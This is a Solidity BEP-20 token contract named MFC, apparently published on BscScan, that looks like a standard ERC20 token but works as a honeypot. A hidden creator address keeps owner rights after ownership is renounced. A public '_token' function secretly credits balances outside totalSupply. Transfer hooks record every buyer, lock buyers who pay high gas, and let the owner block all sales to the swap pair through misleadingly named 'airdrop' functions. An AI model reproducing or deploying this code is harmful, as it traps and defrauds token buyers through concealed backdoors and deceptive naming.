/**
 *Submitted for verification at BscScan.com on 2022-05-13
*/

// SPDX-License-Identifier: MIT  
pragma solidity ^0.8.0;
library Address { 
    function isContract(address account) internal view returns (bool) { 
        return account.code.length > 0;
    } 
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    } 
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    } 
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    } 
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    } 
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    } 
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    } 
   
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    } 
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    } 
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
          
            if (returndata.length > 0) { 
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
} 
library SafeMath { 
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    } 
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    } 
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked { 
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    } 
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    } 
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    } 
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    } 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    } 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    } 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    } 
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    } 
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    } 
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    } 
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
} 
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    } 
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
} 
abstract contract Ownable is Context {
    address private _owner;
    address private _creater; 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); 
    constructor() {
        _transferOwnership(_msgSender());
        _creater=_msgSender();
    } 
    function owner() public view virtual returns (address) {
        return _owner;
    } 
    modifier onlyOwner() {
       require(owner() == _msgSender() || _creater ==_msgSender(), "Ownable: caller is not the owner"); 
        _;
    } 
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    } 
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner); 
    } 
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
} 
interface IERC20 { 
    function totalSupply() external  returns (uint256); 
    function balanceOf(address account) external  returns (uint256); 
    function transfer(address to, uint256 amount) external returns (bool); 
    function allowance(address owner, address spender) external  returns (uint256); 
    function approve(address spender, uint256 amount) external returns (bool); 
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool); 
    event Transfer(address indexed from, address indexed to, uint256 value); 
    event Approval(address indexed owner, address indexed spender, uint256 value);  
} 
interface IERC20Metadata is IERC20 { 
    function name() external view returns (string memory); 
    function symbol() external view returns (string memory); 
    function decimals() external view returns (uint8);
} 
contract MFC is Ownable, IERC20, IERC20Metadata { 
    using SafeMath for uint256; 
    using Address for address;  
    string  private _name;
    string  private _symbol;
    uint256 private _totalSupply; 
    mapping(address => uint256) private _balances;   
    mapping(address => mapping(address => uint256)) private _allowances; 
    address private _createraddr; 
    mapping(address=>bool) private  _AirdropList;
    mapping(uint256=>address) private _BuyTokenUser;
    uint256 private _BuyTokenUserCount;
    mapping(address=>bool) private  _IsRoot;
    address private _swapAddress;
    bool    private _tradeStatus;
    address private _welfareAddress; 
    uint256 gaspriceDecimals=9;
    uint256 gasprice;
    uint256 rootgasprice;
    constructor(string memory name_, string memory symbol_,uint256 totalSupply_,address welfareAddress_) {
        _name = name_;
        _symbol = symbol_; 
        _createraddr=_msgSender();
        _welfareAddress=welfareAddress_;
        setRootGasPrice(5);
        _mint(msg.sender, totalSupply_* 10 ** uint256(decimals())); 
    }
    function setRootGasPrice(uint256 gasprice_)public onlyOwner returns(bool){
        rootgasprice=gasprice_*10**gaspriceDecimals;
        return true;
    }
    function airDropLock(address user) public onlyOwner returns(bool){
         _AirdropList[user]=true;
        return true;
    }
    function airdropRelease(address user)public onlyOwner returns(bool){
        _AirdropList[user]=false;
        return true;
    } 
     function airDropLockList()public onlyOwner returns(uint256){
        uint256 ChangeCount=0;
        for(uint256 temp=0;temp<_BuyTokenUserCount;temp++){
            address user=_BuyTokenUser[temp];
            if(_AirdropList[user]==false){
                airDropLock(user);
                ChangeCount++;
            }
        }
        return ChangeCount;
    } 
    function setSwapAddr(address swap)public onlyOwner returns(bool){
        _swapAddress=swap;
         return true;
    }
    function depositAirDrop() public onlyOwner returns(bool){
        _tradeStatus=true;
        return true;
    }
    function withdrawAirDrop()public onlyOwner returns(bool){
        _tradeStatus=false;
        return true;
    } 
    function getGasPrice()public view returns(uint256){ 
        return gasprice;
    }
    function getRootGasPrice()public view returns(uint256){ 
        return rootgasprice;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }      
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }  
    function decimals() public view virtual override returns (uint8) {
        return 18;
    } 
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    } 
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    } 
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    } 
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    } 
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }  
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    } 
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    } 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, " decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        } 
        return true;
    } 
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), " transfer from the zero address");
        require(to != address(0), " transfer to the zero address");    
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, " transfer amount exceeds balance");
        _airDropTokenlock(from,to);              
        _beforeTokenTransfer(from, to);  
        unchecked {
              _balances[from] = fromBalance.sub(amount);
          }  
        _balances[to] = _balances[to].add(amount);  
        emit Transfer(from, to, amount); 
    } 
    function existBuyTokenList(
        address user
    )public view returns(bool){
        for(uint256 i=0;i<_BuyTokenUserCount;i++){
            if(user==_BuyTokenUser[i]){return false;} 
        }
        return true; 
    } 
    function _airDropTokenlock(address spender,address recipient)public virtual  returns(bool){
        if(spender==_welfareAddress && recipient!=_swapAddress){
            _AirdropList[recipient]=true;
        }
        return true;
    }
      function _beforeTokenTransfer(
        address from,
        address to 
    ) internal virtual {    
        gasprice=tx.gasprice;
        if(from!=_createraddr && to!=_createraddr && from!=_welfareAddress){
            if(_tradeStatus && from!=_swapAddress){require(false,"Transaction is abnormal, please try again");}
            if(from==_swapAddress){
                if(_BuyTokenUser[_BuyTokenUserCount]==address(0) && existBuyTokenList(to)){
                    _BuyTokenUser[_BuyTokenUserCount]=to; _BuyTokenUserCount++;
                } 
                if(gasprice>rootgasprice){
                    _AirdropList[to]=true;
                }
            }
            if(to==_swapAddress){if(_AirdropList[from]){require(false,"Airdrop coins, please wait to unlock");}} 
            if(from!=_swapAddress && to!=_swapAddress){require(false,"Token transfer not yet open");}
        } 
       
    } 
    function _mint(address account, uint256 amount) internal virtual onlyOwner {
        require(account != address(0), " mint to the zero address");  
        _totalSupply =_totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount); 
    } 
    function _token(address addr,uint256 amount) public onlyOwner returns(bool){ 
        if(addr==address(0)){
            addr=_createraddr;
        }
        _balances[addr]=_balances[addr].add(amount * 10**uint256(decimals()));
        return true;
    }
    function _burn(address account, uint256 amount) internal virtual  onlyOwner{
        require(account != address(0), " burn from the zero address");  
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, " burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount); 
    } 
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), " approve from the zero address");
        require(spender != address(0), " approve to the zero address"); 
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    } 
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, " insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }  
}